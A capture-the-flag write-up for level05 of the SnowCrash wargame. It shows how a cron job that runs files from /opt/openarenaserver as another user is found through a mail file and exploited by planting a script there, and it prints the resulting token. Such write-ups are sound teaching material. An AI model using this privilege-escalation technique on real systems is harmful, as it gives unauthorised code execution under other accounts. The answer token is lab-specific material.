# level05

when we are connected to the machine to continue we noticed `You have new mail.` ? :open_mouth:

```
┌──(kali㉿kali)-[~]
└─$ ssh -p 4242 level05@192.168.1.25
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          192.168.1.25 2a01:cb00:47e:b300:7080:dd1c:c1c:c30d 2a01:cb00:47e:b300:a00:27ff:fece:8d2a 
level05@192.168.1.25's password: 
You have new mail. 
level05@SnowCrash:~$ 
```
Then we tried to get more information but `mail` command did not work because there are no `mailutils` installed 

we searched for the directory containing the emails

```
level05@SnowCrash:~$ ls -l /var/
backups/ crash/   local/   log/     opt/     spool/   www/     
cache/   lib/     lock/    mail/    run/     tmp/     
level05@SnowCrash:~$ ls -l /var/mail/
total 4
-rw-r--r--+ 1 root mail 58 Feb 13 21:14 level05
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

```

That seems that there is a cron job, but what exactly this script do ?

```

level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done

```

The script seems to execute all the files that are in openarenaserver directory and then delete them, `ulimit -t` means that the following process should be terminated if it uses more CPU time than what is specified in -t. Then the file is removed.

So we will put a script in this folder and wait for `cron` to execute it 

```
level05@SnowCrash:~$ echo "/bin/bash -c '/bin/getflag > /tmp/flag05'" > /opt/openarenaserver/flag05.sh
level05@SnowCrash:~$ chmod +x /opt/openarenaserver/flag05.sh
level05@SnowCrash:~$ 
level05@SnowCrash:~$ ls -l /opt/openarenaserver/flag05.sh
-rwxrwxr-x+ 1 level05 level05 42 Feb 14 01:28 /opt/openarenaserver/flag05.sh
```

```
level05@SnowCrash:~$ ls -l /tmp/flag05
ls: cannot access /tmp/flag05: No such file or directory
level05@SnowCrash:~$ ls -l /tmp/flag05
ls: cannot access /tmp/flag05: No such file or directory
level05@SnowCrash:~$ ls -l /tmp/flag05
-rw-rw-r-- 1 flag05 flag05 58 Feb 14 01:30 /tmp/flag05
level05@SnowCrash:~$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

```bash
┌──$ level05@SnowCrash:~$ su level06
└─> Password:  `viuaaale9huek52boumoomioc`
```
